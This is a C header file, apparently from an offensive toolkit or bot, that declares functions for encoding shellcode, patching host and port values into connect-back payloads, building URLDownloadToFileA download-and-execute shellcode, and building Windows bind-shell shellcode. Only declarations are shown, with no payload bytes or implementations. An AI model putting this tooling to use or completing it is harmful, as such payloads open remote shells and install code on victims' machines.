
#ifndef __SHELLCODE_H__
#define __SHELLCODE_H__

//
// Helpers
//

typedef bool (*SCCallbackFunc)(char *szShellBuf, int iShellBufSize);
bool contains(char *szBuf, int iSize, char cChar);
int encrypt_shellcode(char *szOrigShell, int iOrigShellSize, \
					  char *szShellBuf, int iShellBufSize, \
					  SCCallbackFunc pfnSC);

//
// Normal CSendFile shellcodes
//

int setup_shellcode(char *szOrigShell, int iOrigShellSize, \
					char *szShellBuf, int iShellBufSize, \
					int iPort, int iHost, int iPortOffset, \
					int iHostOffset, SCCallbackFunc pfnSC);

//
// URLDownloadToFileA shellcodes
//

int setup_shellcode_udtf(char *szShellBuf, int iShellBufSize, \
						 char *szURL, bool bStableESP=false, SCCallbackFunc pfnSC=NULL);

//
// ey4s bind shellcodes
//
#ifdef _WIN32
int setup_shellcode_bind(char *szShellBuf, int iShellBufSize, \
						 unsigned short sPort, bool bStableESP=false, SCCallbackFunc pfnSC=NULL);
#endif // _WIN32

//
// Convert an ASCII buffer to UNICODE
//

int Unicodify(const char *szIn, const unsigned long lInLen, char *szOut, const unsigned long lOutLen);

extern char encoder[];
extern char shellcode_udtf[];

#endif // __SHELLCODE_H__
